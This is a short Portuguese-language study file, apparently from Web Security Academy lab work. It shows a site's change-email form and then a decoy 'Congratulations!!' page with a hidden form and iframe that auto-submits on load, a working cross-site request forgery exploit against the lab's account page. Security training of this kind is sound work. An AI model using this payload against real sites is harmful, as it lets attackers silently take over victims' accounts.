@@ -1,0 +1,44 @@
+AQUI TEM UM EXEMPLO DE UM FORMULÁRIO DO SITE SENDO TRANSFORMADO EM UMA REQUISIÇÃO EM UM WEBSITE FALSO.
+
+	REQUISIÇÃO DO SITE ALVO:
+		 
+		 <form class="login-form" name="change-email-form" action="/my-account/change-email" 			
+		 method="POST">
+                            <label><font style="vertical-align: inherit;"><font style="vertical-align: 
+                            inherit;">E-mail</font></font></label>
+                            <input required="" type="email" name="email" value="">
+                            <button class="button" type="submit"><font style="vertical-align: 
+                            inherit;"><font style="vertical-align: inherit;">Atualizar e-mail</font></
+                            font></button>
+                 </form>
+                 
+                 
+        CÓDIGO HTML DO WEBSITE FALSO:
+        	
+        	<!DOCTYPE html>
+	<html lang="pt-br">
+		<head>		
+    		<meta charset="UTF-8">
+    		<meta name="viewport" content="width=device-width, initial-scale=1.0">
+    		<title>Congratulations!!</title>
+		</head>
+	<body>
+    		<iframe name="ok" style="display: none;"></iframe>
+    		
+    		<img src="https://www.petz.com.br/blog/wp-content/uploads/2019/05/cachorro-			
+    		independente-1.jpg">
+    		
+    		<form target='ok' class="login-form" name="change-email-form" action="https://	
+    		0a4a00070372978980aaa8c100b60015.web-security-academy.net/my-account/change-email" 
+    		method="POST">
+    		
+        	<input  type="hidden" name="email" value="email@mail.com">
+        	
+    		</form>
+
+    		<script>
+			document.forms[0].submit()
+    		</script>
+    
+	</body>
+	</html>
